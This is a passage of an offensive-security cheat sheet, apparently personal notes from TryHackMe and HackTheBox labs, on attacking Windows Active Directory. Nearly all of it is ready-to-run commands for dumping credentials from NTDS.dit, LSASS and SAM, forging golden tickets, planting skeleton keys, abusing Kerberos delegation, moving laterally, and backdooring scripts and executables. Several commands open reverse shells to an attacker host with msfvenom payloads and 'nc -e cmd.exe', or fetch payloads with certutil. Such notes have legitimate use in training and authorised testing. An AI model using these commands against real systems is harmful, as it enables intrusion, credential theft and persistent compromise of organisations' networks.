  - https://blog.xpnsec.com/azuread-connect-for-redteam/
  - https://github.com/dirkjanm/adconnectdump
  - https://app.hackthebox.com/machines/223
1. Extract password with [azuread_decrypt_msol.ps1](https://gist.github.com/analyticsearch/7453d22d737e46657eb57c44d5cf4cbb)
2. If it doesn't work, retrieve `$key_id`, `$instance_id` and `$entropy` with the following command (see also [azuread_decrypt_msol_v2.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c))
   - `sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"`


#### Group Policy Preferences (GPP) AKA MS14-025

1. `smbclient \\\\10.10.10.100\\Replication`
2. `prompt off`
3. `recurse on`
4. `mget *`
   - focus on the files: `Groups.xml`, `Registry.pol`, `GPE.INI`, `GptTmpl.inf`
     - use the command `tree` to explore better the directory
- `gpp-decrypt edBSH0whZlTJt/QS93jjcJ89mjWa89gc8guK0hK0dcqh+ZGMeX0sQbCiheijtlFCuNH9pG8sDVYdYw/NglVmQ`
- read Registry.pol
  - `regpol Registry.pol`
  - `Parse-PolFile -Path Registry.pol`


#### Dump NTDS.dit

- No creds, access on DC: `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
  - `root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local`
- Disk shadow, see: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-diskshadow
- With credentials: `impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6`
- More: https://www.hackingarticles.in/credential-dumping-ntds-dit/



#### Exploiting Domain Trust

1. With mimikatz, recover the KRBTGT password hash
   - `privilege::debug`
   - `lsadump::dcsync /user:za\krbtgt`
2. With PowerShell, recover the SID of the child domain controller
   - `Get-ADComputer -Identity "THMDC"`
3. With PowerShell, recover the SID of the Enterprise Admins
   - `Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc`
4. With mimikatz, create forged TGT
   - `kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt`
5. Verify the golden ticket > after that you can use Rubeus.exe
   - `dir \\thmdc.za.tryhackme.loc\c$`
   

#### AddMember + ForceChangePassword

1. Add our AD account to the IT Support group
   - `Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"`
   - Verify the result with: `Get-ADGroupMember -Identity "IT Support"`
   - At this point you should have inherited 'ForceChangePassword' Permission Delegation
2. Identify the members of the group to select a target. Since the network is shared, it might be best to select one further down in the list
   - `Get-ADGroupMember -Identity "Tier 2 Admins"`  
3. `$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force`
   - `Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password`

- If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run 'gpupdate /force' and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.
- See [Exploiting AD Task 2](https://tryhackme.com/room/exploitingad)


#### Automated Relays

- With BloodHound, find instances where a computer has the "AdminTo" relationship over another computer
  - `MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`
- A requirement is SMB signing enabled, check it with the following command
  - `nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc`
Abuse Print Spooler Service
- Determine if the Print Spooler service is running
  - `GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc`
- Set up NTLM relay
  - `impacket-ntlmrelayx -smb2support -t smb://"THMSERVER1 IP" -debug`
  - `impacket-ntlmrelayx -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug`
- `SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"`

Keylogging

1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1`
2. `sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"`

From the victim
1. `certutil.exe -urlcache -split -f http://IP/shell.ps1`

From Meterpreter
1. `ps | grep "explorer"`
2. `migrate PID`
3. `getuid`
4. `keyscan_start`
5. `keyscan_dump`


#### GenericAll

[GenericAll on user](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-user)
1. `. .\PowerView.ps1`
2. `Get-ObjectAcl -SamAccountName L.Livingstone | ? {$_.ActiveDirectoryRights -eq "GenericAll"}`
3. See GenericAll also in other ways and for groups

[GenericAll on group](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-group)
1. `Get-NetGroup "domain admins"`
2. `Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=resourced,DC=local"}`
3. `net group "domain admins" L.Livingstone /add /domain`

Scenario: you can't access a shell with found credentials
1. run `bloodhound.py`
2. if you've found a GenericAll to a group that can PSremote, run the following command from 'ldeep' https://github.com/franc-pentest/ldeep
   - `ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"`



#### Kerberos Delegation

Resourced Based Constrained Delegation attack
- Requirement: GenericAll on system
1. `impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.174.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'`
2. `python3 /home/kali/Documents/windows-attack/Scripts/rbcd-attack/rbcd.py -dc-ip 192.168.174.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone`
3. `impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.174.175`
4. `export KRB5CCNAME=./Administrator.ccache`
5. `sudo echo '192.168.174.175 resourcedc.resourced.local' >> /etc/hosts`
6. `impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.174.175`

Another way to do it
1. Enumerate available delegations
   - `Import-Module C:\Tools\PowerView.ps1`
   - `Get-NetUser -TrustedToAuth`
2. Get Administrator role, dump secrets to get passwords for target account
   - `token::elevate`
   - `lsadump::secrets`
3. Exit mimikatz > enter Kekeo
4. Generate a TGT to generate tickets for HTTP and WSMAN services
   - `tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted`
5. Forge TGS requests for the account we want to impersonate (for HTTP and WSMAN)
   - `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc`
   - `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc`
6. Exit Kekeo > Open Mimikatz to import the TGS tickets
   - `privilege::debug`
   - `kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
   - `kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
7. Exit mimikatz, run `klist` to verify that everything went fine
8. `New-PSSession -ComputerName thmserver1.za.tryhackme.loc`
9. `Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc`
10. `whoami`


#### Kerberos Backdoors / Kerberos Skeleton

1. `privilege::debug`
2. `misc::skeleton`
Accessing the forest
- the default password is 'mimikatz', some examples:
  - `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
  - `dir \\Desktop-1\c$ /user:Machine1 mimikatz`


#### Testing found credentials

- `crackmapexec smb 192.168.174.187 -u usernames.txt -p passwords.txt --continue-on-success`
  - test `impacket-psexec` on success
- `crackmapexec winrm 192.168.212.165 -u users.txt -p passwords.txt --continue-on-success`
  - test `evil-winrm` on success
- `crackmapexec smb 192.168.174.187 -u usernames.txt -H hashes.txt --continue-on-success`
  - test the found hashes
- `runas.exe /netonly /user:<domain>\<username> cmd.exe`
- `xfreerdp /u:bitbucket /p:littleredbucket /cert:ignore /v:10.10.187.9`
- Note for post exploitation: you might find an `.xml` like `username.xml`. To test it:
  1. `$Credential = Import-Clixml -Path ./username.xml`
  2. `$Credential.GetNetworkCredential().password`
  - The last commnad, try it even randomly before saving something in `$credential`, you never know


#### <ins>Lateral Movement Techniques and Pivoting</ins>

- See: https://tryhackme.com/room/lateralmovementandpivoting
- `psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`
- `winrs.exe -r:THMIIS.za.tryhackme.com cmd`

#### WMI and WinRM

1. Create a PSCredential object that stores session's username and password
   ```PowerShell
   $username = '<username>';
   $password = '<password>';
   $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
   ```
2. Create a Common Information Model
   ```PowerShell
   $options = New-CimSessionOption -Protocol DCOM
   $session = New-Cimsession -ComputerName <IP> -Credential $credential -SessionOption $options
   $command = 'calc';
   ```
3. Tie all together with `Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};`

Another lateral movement
- `winrs -r:<target> -u:<username> -p:<password>  "cmd /c hostname & whoami"`
- `winrs -r:<target> -u:<username> -p:<password>  "powershell -nop -w hidden -e <BASE64>"`

PowerShell remoting
```PowerShell
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <IP> -Credential $credential
```
- To interact with the session, run the command `Enter-PSSession <SESSION-ID>`

**Connecting to WMI From Powershell, another process**
- Create a PSCredential object
  ```PowerShell
  $username = 'Administrator';
  $password = 'Mypass123';
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
  ```
- Enstablish a connection
  - `Enter-PSSession -Computername TARGET -Credential $credential`
  - `Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}`
  - ```PowerShell
    $Opt = New-CimSessionOption -Protocol DCOM
    $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
    $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
    Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
    ```
- Same process done with wmic.exe
  - `wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"`
  - `winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`
- Create Services Remotely with WMI
  - `Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{Name = "THMService2";DisplayName = "THMService2";PathName = "net user munra2 Pass123 /add";ServiceType = [byte]::Parse("16");StartMode = "Manual" }`
  - `$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"`
  - `Invoke-CimMethod -InputObject $Service -MethodName StartService`
  - Stop and delete service
    ```PowerShell
    Invoke-CimMethod -InputObject $Service -MethodName StopService
    Invoke-CimMethod -InputObject $Service -MethodName Delete
    ```

**Creating Scheduled Tasks Remotely with WMI**
- ```PowerShell
  $Command = "cmd.exe"
  $Args = "/c net user munra22 aSdf1234 /add"
  $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
  Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
  Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
  Delete unscheduled task
  ```
- Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"

**Example with WMI**
1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.46.25 LPORT=4445 -f msi > myinstaller.msi`
2. `smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994`
3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.46.25; set LPORT 4445;exploit"`
4. ```PowerShell
   $username = 't1_corine.waters';
   $password = 'Korine.1994';
   $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
   $Opt = New-CimSessionOption -Protocol DCOM
   $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
   ```
5. `Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`

#### Remotely Creating Services Using sc
```Powershell
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add"
start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

#### Creating Scheduled Tasks Remotely
```Powershell
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1" 
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

#### Spawn process remotely
1. `msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.25 LPORT=4444 -o myservice.exe`
2. `smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever`
3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.46.25; set LPORT 4444;exploit"`
4. `nc -lvp 4443`

From the new shell on the listener
5. `runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.46.25 4443"`
6. `sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto`
7. `sc.exe \\thmiis.za.tryhackme.com start THMservice-3249`


#### Backdooring .vbs Scripts
- `CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True`

#### Backdooring .exe Files
- `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`

#### RDP hijacking
1. Run `cmd` as Administrator
2. `PsExec64.exe -s cmd.exe`
3. List server's sessions with '`query user`'
4. Use `tscon.exe` and specify the `session ID` we will be taking over, as well as our current `SESSIONNAME`
   - `tscon 3 /dest:rdp-tcp#6`
   
#### SSH Remote Port Forwarding
- Victim: `ssh attacker@10.50.46.25 -R 3389:3.3.3.3:3389 -N`
- Attacker: `xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword`

#### SSH Local Port Forwarding (to expose attacker's port 80)

Victim
1. `ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N`
2. ```Powershell
   add firewall rule
   netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
   ```
   
#### Port Forwarding With socat
1. Open port `1234` and redirect to port `4321` on host `1.1.1.1`
   ```Powershell
   socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
   ```
2. `netsh advfirewall firewall add rule name="Open Port 1234" dir=in action=allow protocol=TCP localport=1234`
- To expose attacker's port `80`: `socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80`
- Example
  ```Powershell
  socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
  xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
  ```

#### Dynamic Port Forwarding and SOCKS
- Victim: `ssh attacker@10.50.46.25 -R 9050 -N`
- Attacker: 
  1. ```
     [ProxyList]
     socks4  127.0.0.1 9050
	 ```
  2. `proxychains curl http://pxeboot.za.tryhackme.com`

#### Rejetto HFS
1. `ssh tunneluser@10.50.46.25 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N`
2. `windows/http/rejetto_hfs_exec`
- See: [Task 7 "Tunnelling Complex Exploits"](https://tryhackme.com/room/lateralmovementandpivoting)

#### PsExec
```PowerShell
./PsExec64.exe -i  \\<TARGET> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
```
Requirements
- The user that authenticates to the target machine needs to be part of the Administrators local group
- An SMB connection through the firewall
- The `ADMIN$` share must be available
- File and Printer Sharing has to be turned on

#### Pass the Hash
```PowerShell
/usr/bin/impacket-wmiexec -hashes :<hash> <username>@<IP>
```

1. Extract hashes
   ```PowerShell
   lsadump::sam
   sekurlsa::msv
   ```
3. Perform the PtH
   ```PowerShell
   token::revert
   sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
   ```
4. On the reverse shell
   ```PowerShell
   winrs.exe -r:THMIIS.za.tryhackme.com cmd
   ```

Requirements
- An SMB connection through the firewall
- The `ADMIN$` share must be available
- The attacker must present valid credentials with local administrative permission

#### Pass the Key / Overpass the Hash

1. Run the Notepad with `Run as different user` to cache the credentials on the machine
2. Run mimikatz. Execute the commands `privilege::debug` and `sekurlsa::logonpasswords` to dump the password hash for the user just used
3. Now, in mimikatz, execute the command `sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell` to run a PowerShell
4. Authenticate to a network share of the target `net use \\<target>`
5. Use `klist` to notice the newly requested Kerberos tickets, including a TGT and a TGS for the Common Internet File System (CIFS)
6. Now you can run `.\PsExec.exe \\<target> cmd`

Process
1. `sekurlsa::ekeys` 
2. RC4 hash
   ```PowerShell
   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
   AES128 hash
   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
   AES256 hash
   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
   ```
4. On the reverse shell
   ```PowerShell
   winrs.exe -r:THMIIS.za.tryhackme.com cmd
   ```

#### Pass the Ticket

1. Run mimikatz. Execute `#privilege::debug`
2. `sekurlsa::tickets /export` export all the TGT/TGS from memory
3. Verify generated tickets with `PS:\> dir *.kirbi`. Search for an administrator ticket in the local directory
4. Inject a ticket from mimikatz with `kerberos::ptt <ticket_name>`
   - Example: `kerberos::ptt [0;193553]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
5. Inspect the injected ticket with `C:\> klist`
6. Access the restricted shared folder.
   - Example `dir \\192.168.179.128\admin$`

#### DCOM

1. `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))` remotely Instantiate the MMC Application object
2. `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")` execute a command on the remote DCOM object
3. `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64>","7")` reverse shell, run a listener with `nc -lnvp 443`


### <ins>Credentials Harvesting</ins>

#### Cedential Access

Clear-text files
- `C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Database files
- `cd C:\ProgramData\McAfee\Agent\DB > ma.db > sqlitebrowser ma.db`
- [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption/)

Memory
- Clear-text credentials
- Cached Passwords
- AD Tickets

Password managers
- example: `*.kdbx`

Enterprise Vaults

Active Directory
- Users' description
- Group Policy SYSVOL
- NTDS
- AD Attacks

Network Sniffing

Registry
- `reg query HKLM /f password /t REG_SZ /s`
- `reg query HKCU /f password /t REG_SZ /s`


Years ago you could find clear-text password in the GPP, so give it a shot. If it’s a new enviorments it won’t probably work tho.


#### Windows Credentials

- Keystrokes (keyscan_start / keyscan_stop)
- `copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\`
- `meterpreter > hashdump`

Shadow Copy Service
1. `wmic shadowcopy call create Volume='C:\'`
2. `vssadmin list shadows`
3. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam`
4. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system`

Registry Hives
1. `reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg`
2. `reg save HKLM\system C:\users\Administrator\Desktop\system-reg`

Now, you can decrypt
- copy the files with `scp username@remoteHost:/remote/dir/file.txt /local/dir/`
- `impacket-secretsdump -sam /tmp/sam-reg -system /tmp/system-reg LOCAL`


#### Dump LSASS

GUI
1. Open Task Manager
2. Search for `lsass.exe` > right click "Create dump file"
3. `copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP`

Mimikatz
1. `privilege::debug`
2. `sekurlsa::logonpasswords`

Protected LSASS
1. `privielege::debug`
2. `!+`
3. `!processprotect /process:lsass.exe /remove`
4. `sekurlsa::logonpasswords`
   
   
#### Accessing Credential Manager

1. `vaultcmd /list`
2. `VaultCmd /listproperties:"Web Credentials"`
3. `VaultCmd /listcreds:"Web Credentials"`

RunAs
1. `cmdkey /list`
2. If it's not empty
   - `runas /savecred /user:THM.red\thm-local cmd.exe`
   
Mimikatz
1. `privilege::debug`
2. `sekurlsa::credman`


#### Domain Controller

1. `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
2. `impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local`
3. `impacket-secretsdump -just-dc THM.red/<AD_Admin_User>@10.10.153.149`
   - `impacket-secretsdump -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.153.149`
4. `hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`


#### Local Administrator Password Solution (LAPS)

1. Verify if there is LAPS in the machine
   - `dir "C:\Program Files\LAPS\CSE"`
2. `Get-Command *AdmPwd*`
3. Find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS
   - `Find-AdmPwdExtendedRights -Identity THMorg`
   - `Find-AdmPwdExtendedRights -Identity *`
4. Cheeck the group and its members
   - `net groups "TARGET GROUP"`
   - `net user test-admin`
5. Compromise one of those accounts, get the password
   - `runas.exe /netonly /user:bk-admin cmd.exe`
   - `Get-AdmPwdPassword -ComputerName creds-harvestin`
   
#### Rubeus Harvesting

- `Rubeus.exe harvest /interval:30`


#### <ins>Active Directory Persistence</ins>

#### Golden Ticket

- With this attack, you can gain access to every machine in the AD
- You need a kerberoast ticket granting account and With mimikatz from the DC
- You may need to purge: `kerberos::purge`
- See this if you are having trouble: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html

Process
1. `privilege::debug`
2. Dump the krbtgt hash
   - `lsadump::lsa /inject /name:krbtgt or `lsadump::lsa /patch`
   - copy the SID and the NTLM
3. `kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /ptt`
4. `misc::cmd`
5. from the opened CMD, try `dir \\USERNAME\\C$`
   - consider also to download psexec in the machine compromised for more access
   - `psexec.exe \\USERNAME cmd.exe`


#### Shadow copies

1. `vshadow.exe -nw -p  C:` perform a shadow copy of the `C:` drive
2. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak` copy the ntds database to the C: drive
3. `reg.exe save hklm\system c:\system.bak` save the SYSTEM hive from the Windows registry
4. `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` extract the credential materials

#### Through Credentials

1. DCSync All with mimikatz
   - `privilege::debug`
   - `log <username>_dcdump.txt`
   - `lsadump::dcsync /domain:za.tryhackme.loc /all`
2. `cat <username>_dcdump.txt | grep "SAM Username"`
3. `cat <username>_dcdump.txt | grep "Hash NTLM"`
- You can also target only one user with the following command
  - `lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>`
  

#### Through Certificates

1. See certificates stored
   - `crypto::certificates /systemstore:local_machine`
2. Patch memory to make these keys exportable
   - `crypto::capi`
   - `crypto::cng`
3. Export the certificates
   - `crypto::certificates /systemstore:local_machine /export`
4. Generate certificates
   - `ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123`
5. Use Rubeus to request a TGT using the certificate
   - `Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101`
6. Load the TGT to auth to DC, with mimikatz
   - `kerberos::ptt administrator.kirbi`


#### Trough SID History

- If you need to fix SID history (ntds.dit)
  https://github.com/MichaelGrafnetter/DSInternals
1. Confirm that your user has no SID history
   - `Get-ADUser <your ad username> -properties sidhistory,memberof`
2. Get the SID of the Domain Admins
   - `Get-ADGroup "Domain Admins"Get-ADGroup "Domain Admins"`
3. Patch the ntds.dit file with DSInternals
   - `Stop-Service -Name ntds -force`
   - `Stop-Service -Name ntds -force`
   - `Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit`
   - `Start-Service -Name ntds`
   - `Restart-Service -Name NTDS`
4. Exit and Log in, verify the SID history
   - `Get-ADUser aaron.jones -Properties sidhistory`
5. Test your Admin privileges
   - `dir \\thmdc.za.tryhackme.loc\c$`
   
   
#### Trough metasploit

1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=445 -f exe -o shell.exe`
2. `use exploit/multi/handler`
3. `set payload windows/meterpreter/reverse_tcp`
4. after the shell is spawned: `background`
5. `use exploit/windows/local/persistence`
6. `set settion 1`
7. `run`
- If the session dies, just run again `run`
- https://docs.rapid7.com/metasploit/about-post-exploitation/
